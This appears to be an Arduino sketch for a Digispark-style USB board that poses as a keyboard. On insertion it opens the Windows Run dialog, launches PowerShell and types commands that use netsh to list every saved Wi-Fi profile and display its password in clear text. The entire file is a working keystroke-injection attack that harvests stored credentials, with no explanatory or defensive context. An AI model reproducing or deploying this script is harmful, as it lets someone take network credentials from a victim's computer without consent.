#include "DigiKeyboard.h"
void typeCommand(const __FlashStringHelper *cmd) {
  DigiKeyboard.print(cmd);
  DigiKeyboard.sendKeyStroke(0x28); 
  DigiKeyboard.delay(1500);         
}

void setup() {

  DigiKeyboard.delay(6000); 
  DigiKeyboard.sendKeyStroke(0); 

  DigiKeyboard.sendKeyStroke(0x15, 0x08); 
  DigiKeyboard.delay(1200); 


  DigiKeyboard.print(F("powershell"));
  DigiKeyboard.sendKeyStroke(0x28); 
  DigiKeyboard.delay(3000); 

  typeCommand(F("[Console]::OutputEncoding = [System.Text.Encoding]::UTF8"));

  typeCommand(F("$wlan = (netsh wlan show profiles) | Select-String '\\:(.+)$'"));

  typeCommand(F("$wlan | ForEach-Object { $n=$_.Matches.Value.Split(':')[-1].Trim(); $p=(netsh wlan show profiles name=\"$n\" key=clear | Select-String 'Key Content\\s*\\:(.+)$'); if($p){$w=$p.Matches.Value.Split(':')[-1].Trim()}else{$w='[None]'}; if($n -and $n -notmatch 'All User Profile'){ [PSCustomObject]@{WiFi_Name=$n; Password=$w} } } | Format-Table -AutoSize"));
}

void loop() {

}
